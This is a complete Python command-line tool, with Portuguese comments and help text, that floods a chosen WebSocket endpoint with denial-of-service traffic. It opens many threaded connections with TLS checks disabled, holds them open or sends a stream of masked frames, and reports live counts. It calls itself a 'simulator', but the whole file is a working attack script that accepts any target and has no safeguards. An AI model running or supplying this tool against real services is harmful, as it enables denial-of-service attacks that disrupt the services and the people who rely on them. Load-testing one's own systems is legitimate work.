#!/usr/bin/env python3
import sys
import argparse
import socket
import ssl
import threading
import time
import random
import struct
import base64
import os

# Configuração de cores
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'

stats = {
    "connected": 0,
    "msgs_sent": 0,
    "errors": 0
}
running = True

def create_websocket_frame(message):
    # RFC 6455 Framing (Client -> Server must be masked)
    # Byte 0: FIN(1) RSV(000) Opcode(0001=Text) -> 0x81
    # Byte 1: Mask(1) PayloadLen(7bits)

    msg_bytes = message.encode('utf-8')
    length = len(msg_bytes)

    frame = bytearray()
    frame.append(0x81) # FIN + Text

    # Simple length logic (assuming small messages for flood < 125 bytes)
    if length < 126:
        frame.append(0x80 | length) # Mask bit set
    elif length < 65536:
        frame.append(0x80 | 126)
        frame.extend(struct.pack('!H', length))
    else:
        frame.append(0x80 | 127)
        frame.extend(struct.pack('!Q', length))

    # Masking Key (4 bytes)
    mask_key = os.urandom(4)
    frame.extend(mask_key)

    # Mask payload
    masked_payload = bytearray(length)
    for i in range(length):
        masked_payload[i] = msg_bytes[i] ^ mask_key[i % 4]

    frame.extend(masked_payload)
    return frame

def ws_thread(host, port, path, https, msg_flood, delay):
    global stats, running

    while running:
        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)

            if https:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = context.wrap_socket(s, server_hostname=host)

            s.connect((host, port))

            # Handshake
            key = base64.b64encode(os.urandom(16)).decode('utf-8')
            req = (
                f"GET {path} HTTP/1.1\r\n"
                f"Host: {host}:{port}\r\n"
                f"Upgrade: websocket\r\n"
                f"Connection: Upgrade\r\n"
                f"Sec-WebSocket-Key: {key}\r\n"
                f"Sec-WebSocket-Version: 13\r\n"
                f"User-Agent: Python/WS-Flood\r\n"
                f"\r\n"
            )
            s.send(req.encode('utf-8'))

            response = s.recv(4096)
            if b"101 Switching Protocols" in response:
                stats["connected"] += 1
                # Flood loop
                while running:
                    if msg_flood:
                        frame = create_websocket_frame(f"Flood-{random.randint(1000,9999)}")
                        s.send(frame)
                        stats["msgs_sent"] += 1
                        if delay > 0:
                            time.sleep(delay)
                    else:
                        # Just hold connection
                        time.sleep(1)
            else:
                stats["errors"] += 1
                s.close()
                time.sleep(1)

        except Exception:
            stats["errors"] += 1
            if s:
                try: s.close()
                except: pass
            time.sleep(1)

def monitor_thread():
    global stats, running
    while running:
        print(f"\r{Colors.OKBLUE}[*] Conexões: {stats['connected']} | Msgs Enviadas: {stats['msgs_sent']} | Erros: {stats['errors']}{Colors.ENDC}", end="")
        time.sleep(1)

def main():
    global running
    parser = argparse.ArgumentParser(description="Simulador de WebSocket Flood")
    parser.add_argument("host", help="Host alvo (ex: echo.websocket.org)")
    parser.add_argument("--port", type=int, default=80, help="Porta (default: 80, use 443 para SSL)")
    parser.add_argument("--path", default="/", help="Caminho do WS (ex: /chat)")
    parser.add_argument("--https", action="store_true", help="Usar SSL/TLS (WSS)")
    parser.add_argument("--threads", type=int, default=10, help="Número de threads/conexões (default: 10)")
    parser.add_argument("--flood", action="store_true", help="Enviar mensagens continuamente (Flood)")
    parser.add_argument("--delay", type=float, default=0.1, help="Delay entre mensagens (s) (default: 0.1)")
    parser.add_argument("--duration", type=int, default=60, help="Duração (s)")

    args = parser.parse_args()

    print(f"{Colors.HEADER}=== Iniciando WebSocket Flood Simulator ==={Colors.ENDC}")
    print(f"Alvo: {args.host}:{args.port}{args.path} (WSS: {args.https})")

    monitor = threading.Thread(target=monitor_thread)
    monitor.daemon = True
    monitor.start()

    threads = []
    for _ in range(args.threads):
        t = threading.Thread(target=ws_thread, args=(args.host, args.port, args.path, args.https, args.flood, args.delay))
        t.daemon = True
        t.start()
        threads.append(t)

    try:
        time.sleep(args.duration)
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}Interrompido!{Colors.ENDC}")

    running = False
    print(f"\n{Colors.OKGREEN}Teste finalizado.{Colors.ENDC}")
    print(f"Total Msgs Enviadas: {stats['msgs_sent']}")

if __name__ == "__main__":
    main()
